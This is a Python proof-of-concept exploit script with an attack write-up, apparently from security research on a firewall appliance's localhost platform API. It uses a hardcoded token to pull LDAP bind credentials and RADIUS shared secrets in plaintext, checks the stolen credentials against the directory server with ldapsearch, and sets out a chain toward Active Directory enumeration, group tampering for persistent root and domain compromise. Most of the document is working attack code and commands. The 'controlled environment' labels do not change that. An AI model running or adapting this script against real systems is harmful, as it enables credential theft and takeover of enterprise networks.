"""
F-FTD-89: LDAP bind credential exfiltration via platform API /sys/ldap
CONTROLLED ENVIRONMENT ONLY

Root cause:
  SF/REST_API/LDAP.pm:
    $self->{_url_prefix} = $SF::REST_API::url_prefix . "/sys/ldap"
    Encodes: key => "$provider->{user_password}"  ← LDAP bind password in API

  The platform API at http://127.0.0.1:5985/platform/api/sys/ldap/provider
  returns the LDAP configuration including:
    - rootdn: LDAP bind distinguished name (service account DN)
    - key: LDAP bind password (plaintext in API response)
    - name: LDAP server IP/hostname
    - port: LDAP port (389 unencrypted or 636 SSL)
    - vendor: ActiveDirectory|OracleDirectory|OpenLdap|Other

  Authentication to this endpoint:
    TOKEN: clish → FTD-CLI: true (F-FTD-87, hardcoded token)
    No external JWT required — localhost platform API with hardcoded token

IMPACT:
  If FTD is configured for LDAP/AD authentication (enterprise deployments):
  1. From www shell: GET http://127.0.0.1:5985/platform/api/sys/ldap/provider
     → returns full LDAP config with bind DN and bind password

  2. LDAP bind credentials (rootdn/key) are typically a service account in AD
     → Allows:
       a) Authenticate to AD LDAP as service account
       b) Enumerate all AD users, groups, OUs (full LDAP read)
       c) If service account has write permissions: modify group membership,
          reset user passwords, create accounts
       d) Credential reuse against AD (LDAP bind = AD authentication)

  3. sudoers: %ldapgroup ALL = (ALL) ALL
     → Any user in the %ldapgroup LDAP group gets root on FTD
     → LDAP bind creds → enumerate %ldapgroup members → those users get root

  4. Enterprise blast radius: LDAP service account credentials → AD pivot
     → complete enterprise domain compromise from FTD access

ALSO PRESENT — RADIUS credentials:
  SF/REST_API/AAA.pm (parent class of LDAP.pm) manages /sys/radius
  RADIUS shared secret is similarly stored in platform API config:
    GET /sys/radius/provider → radius server config
  If RADIUS secret is exposed: RADIUS spoofing, session hijack

ATTACK:
  From www shell (post F-FTD-67, F-FTD-78, or other):

  # Retrieve LDAP config (bind DN + password):
  curl -s -H 'TOKEN: clish' http://127.0.0.1:5985/platform/api/sys/ldap/provider
  → JSON: {"aaaLdapProvider": [{"rootdn": "CN=svc-ftd,...", "key": "LdapP@ss1", ...}]}

  # Retrieve RADIUS config (shared secret):
  curl -s -H 'TOKEN: clish' http://127.0.0.1:5985/platform/api/sys/radius/provider
  → JSON: {"aaaRadiusProvider": [{"key": "radius_secret", "name": "192.168.1.50", ...}]}

  # Test LDAP bind with extracted credentials:
  ldapsearch -H ldap://192.168.1.50 -D "CN=svc-ftd,..." -w "LdapP@ss1" \
    -b "DC=corp,DC=example,DC=com" "(objectClass=user)" sAMAccountName

  # Enumerate AD group membership for FTD's ldapgroup:
  ldapsearch -H ldap://... -D "..." -w "..." \
    -b "DC=corp,..." "(cn=FTD_Admins)" member

CHAIN:
  F-FTD-78 (pre-auth HA) OR F-FTD-79 (Admin123) → www shell
  → TOKEN: clish → GET /sys/ldap/provider → LDAP bind creds
  → AD pivot: full domain enum, group manipulation, credential reuse

  CRITICAL AMPLIFIER:
  sudoers: %ldapgroup ALL = (ALL) ALL
  → With LDAP bind creds, enumerate ldapgroup membership
  → Any AD user in %ldapgroup → sudo root on FTD without additional exploit
  → Or: add attacker's AD user to %ldapgroup → persistent root access
    (requires LDAP write permission for the service account)

SCOPE NOTE:
  Only exploitable on FTD instances configured with LDAP/AD authentication
  (enterprise deployments). FTDs with local-only auth have no LDAP binding.
  Enterprise FTDs with FMC management frequently use AD integration → HIGH
  probability of this being populated on managed enterprise deployments.

VERIFY (controlled environment):
  # Check if LDAP is configured:
  curl -s -H 'TOKEN: clish' http://127.0.0.1:5985/platform/api/sys/ldap/provider
  # If response includes aaaLdapProvider array: LDAP configured

  # Check if RADIUS is configured:
  curl -s -H 'TOKEN: clish' http://127.0.0.1:5985/platform/api/sys/radius/provider

Affected: FTD 6.7.0-65 (SF/REST_API/LDAP.pm confirmed key field in API response;
          /sys/ldap endpoint accessible with TOKEN: clish from www shell)
Severity: HIGH (CRITICAL if AD-joined) — LDAP bind credentials expose full AD
          directory when service account has read access; %ldapgroup mapping
          enables persistent root without sudo exploit
Auth required: www shell (post F-FTD-67, F-FTD-78, or equivalent)
"""

# CONTROLLED ENVIRONMENT ONLY

import sys
import subprocess
import json


PLATFORM_API_BASE = "http://127.0.0.1:5985/platform/api"
CLI_TOKEN = "clish"


def get_ldap_config():
    """
    Retrieve LDAP configuration from platform API.
    Returns bind DN and bind password.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print("[*] F-FTD-89: Retrieving LDAP config from platform API")
    url = f"{PLATFORM_API_BASE}/sys/ldap/provider"

    cmd = ["curl", "-s", "-H", f"TOKEN: {CLI_TOKEN}",
           "-H", "Content-Type: application/json", url]

    print(f"    Command: curl -s -H 'TOKEN: clish' {url}")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if result.returncode != 0 or not result.stdout:
            print(f"[-] No response (platform API not reachable or LDAP not configured)")
            return None

        data = json.loads(result.stdout)
        providers = data.get("aaaLdapProvider", [])

        if not providers:
            print(f"[-] No LDAP providers configured")
            return None

        print(f"[!!!] {len(providers)} LDAP provider(s) found:")
        for p in providers:
            print(f"\n    Server:   {p.get('name')} (port {p.get('port')})")
            print(f"    SSL:      {p.get('enableSSL')}")
            print(f"    Type:     {p.get('vendor')}")
            print(f"    Bind DN:  {p.get('rootdn')}")
            print(f"    Password: {p.get('key')}")   # LDAP bind password
            print(f"    DN:       {p.get('dn')}")

        return providers

    except json.JSONDecodeError:
        print(f"    Raw response: {result.stdout[:300]}")
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def get_radius_config():
    """
    Retrieve RADIUS configuration from platform API.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print("[*] F-FTD-89: Retrieving RADIUS config from platform API")
    url = f"{PLATFORM_API_BASE}/sys/radius/provider"

    cmd = ["curl", "-s", "-H", f"TOKEN: {CLI_TOKEN}", url]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if not result.stdout:
            print(f"[-] No response")
            return None

        data = json.loads(result.stdout)
        providers = data.get("aaaRadiusProvider", [])

        if not providers:
            print(f"[-] No RADIUS providers configured")
            return None

        print(f"[!!!] {len(providers)} RADIUS provider(s) found:")
        for p in providers:
            print(f"\n    Server:        {p.get('name')} (port {p.get('port')})")
            print(f"    Shared secret: {p.get('key')}")
            print(f"    Timeout:       {p.get('timeout')}")

        return providers

    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def test_ldap_bind(server, port, bind_dn, bind_pw, base_dn=None):
    """
    Test LDAP bind with extracted credentials.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-89: Testing LDAP bind: ldap://{server}:{port}")
    print(f"    DN: {bind_dn}")

    if not base_dn:
        # Derive base DN from bind DN (e.g., DC=corp,DC=example,DC=com)
        parts = bind_dn.split(',')
        dc_parts = [p for p in parts if p.startswith('DC=')]
        base_dn = ','.join(dc_parts) if dc_parts else "DC=corp,DC=local"

    cmd = [
        "ldapsearch", "-x",
        f"-H", f"ldap://{server}:{port}",
        "-D", bind_dn,
        "-w", bind_pw,
        "-b", base_dn,
        "(objectClass=*)", "cn", "sAMAccountName"
    ]
    cmd += ["-s", "one", "-z", "5"]  # shallow search, max 5 results

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        if result.returncode == 0:
            print(f"[!!!] LDAP bind CONFIRMED: {server}:{port}")
            print(f"      Partial results: {result.stdout[:500]}")
        else:
            print(f"[-] LDAP bind failed: {result.stderr.strip()[:100]}")
    except FileNotFoundError:
        print(f"[!] ldapsearch not installed. Verify manually:")
        print(f"    ldapsearch -x -H ldap://{server}:{port} -D '{bind_dn}' -w '<password>' -b '{base_dn}'")
    except Exception as e:
        print(f"[-] Error: {e}")


def print_exfil_summary():
    print("""
F-FTD-89: LDAP/RADIUS Credential Exfiltration via Platform API
===============================================================

Endpoint: http://127.0.0.1:5985/platform/api/sys/ldap/provider
Token:    TOKEN: clish (hardcoded, no JWT required — F-FTD-87)

Returns LDAP config:
  rootdn: <bind DN>      ← AD service account distinguished name
  key:    <bind password> ← AD service account password (PLAINTEXT)
  name:   <LDAP server IP>
  vendor: MS-AD|OracleDirectory|OpenLdap|Other

Also: /sys/radius/provider → RADIUS shared secret (plaintext)

BLAST RADIUS:
  LDAP bind creds → full AD read (all users, groups, OUs, GPOs)
  If bind account has write: modify group membership, reset passwords
  sudoers %ldapgroup root grant → add attacker user to AD group → root
  RADIUS secret → forge RADIUS responses, session hijack, auth bypass

PROBABILITY: HIGH on enterprise FTD deployments (FMC-managed with AD SSO)
""")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-89: LDAP bind credential exfil via platform API /sys/ldap")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)

    mode = sys.argv[1] if len(sys.argv) > 1 else "show"

    if mode == "show":
        print_exfil_summary()

    elif mode == "ldap":
        providers = get_ldap_config()
        if providers and len(sys.argv) > 2 and sys.argv[2] == "test":
            for p in providers:
                test_ldap_bind(p['name'], p.get('port', 389), p['rootdn'], p['key'])

    elif mode == "radius":
        get_radius_config()

    elif mode == "all":
        get_ldap_config()
        print()
        get_radius_config()

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
